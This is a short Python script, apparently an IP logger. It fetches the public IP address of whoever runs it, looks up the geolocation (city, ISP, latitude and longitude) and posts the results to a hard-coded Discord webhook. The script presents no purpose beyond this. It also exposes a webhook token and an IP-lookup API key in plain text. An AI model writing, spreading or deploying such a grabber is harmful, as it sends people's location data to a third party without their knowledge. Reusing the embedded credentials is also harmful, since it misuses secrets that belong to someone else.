import requests
from dhooks import Webhook, Embed
from datetime import datetime

def get_ip_info():
    hook = Webhook("https://discord.com/api/webhooks/1261755337841578147/Z1wvws8O10jfYE2qC5V2JBPqiJuyapNss-Du3_fT1Hy_KsyG6tSiOMcfViCVmg-tKUTr")

    time = datetime.now().strftime("%H:%M %p")  
    ip = requests.get('https://api.ipify.org/').text  # Correction de l'URL

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    api_key = 'nIXUwtd0aBhjTo2NF4LZ'  # Remplacez 'YOUR_API_KEY' par votre clé API obtenue

    r = requests.get(f'http://extreme-ip-lookup.com/json/{ip}?key={api_key}', headers=headers)  # Ajout de la clé API à la requête
    geo = r.json()

    # Debugging: print the entire response
    print("API Response:", geo)

    embed = Embed()
    fields = [
        {'name': 'IP', 'value': geo.get('query', 'N/A')},
        {'name': 'ipType', 'value': geo.get('ipType', 'N/A')},
        {'name': 'Country', 'value': geo.get('country', 'N/A')},
        {'name': 'City', 'value': geo.get('city', 'N/A')},
        {'name': 'Continent', 'value': geo.get('continent', 'N/A')},
        {'name': 'IPName', 'value': geo.get('ipName', 'N/A')},
        {'name': 'ISP', 'value': geo.get('isp', 'N/A')},
        {'name': 'Latitude', 'value': geo.get('lat', 'N/A')},
        {'name': 'Longitude', 'value': geo.get('lon', 'N/A')},
        {'name': 'Org', 'value': geo.get('org', 'N/A')},
        {'name': 'Region', 'value': geo.get('region', 'N/A')},
        {'name': 'Status', 'value': geo.get('status', 'N/A')},
    ]

    for field in fields:
        if field['value'] and field['value'] != 'N/A':
            embed.add_field(name=field['name'], value=field['value'], inline=True)

    hook.send(embed=embed)

if __name__ == "__main__":
    get_ip_info()